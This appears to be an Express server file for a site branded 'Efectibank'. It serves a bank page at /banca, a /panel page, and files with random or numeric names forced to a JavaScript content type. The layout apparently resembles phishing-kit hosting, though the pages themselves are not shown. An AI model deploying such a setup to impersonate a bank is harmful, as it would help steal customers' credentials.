const express = require("express");
const path = require("path");

const app = express();
const port = Number(process.env.PORT) || 8080;
const publicDir = path.join(__dirname, "public");

app.disable("x-powered-by");

app.use(
  express.static(publicDir, {
    setHeaders(res, filePath) {
      const name = path.basename(filePath).toLowerCase();
      if (name.includes(".js") || name.startsWith("js") || name === "q8a4rrtl79" || /^\d+$/.test(name)) {
        res.type("application/javascript; charset=utf-8");
      }
    },
  })
);

app.get("/banca", (_req, res) => {
  res.sendFile(path.join(publicDir, "banca.html"));
});

app.get("/panel", (_req, res) => {
  res.sendFile(path.join(publicDir, "panel.html"));
});

app.get("/health", (_req, res) => {
  res.status(200).json({ ok: true });
});

app.listen(port, "0.0.0.0", () => {
  console.log(`Efectibank listo en el puerto ${port}`);
});
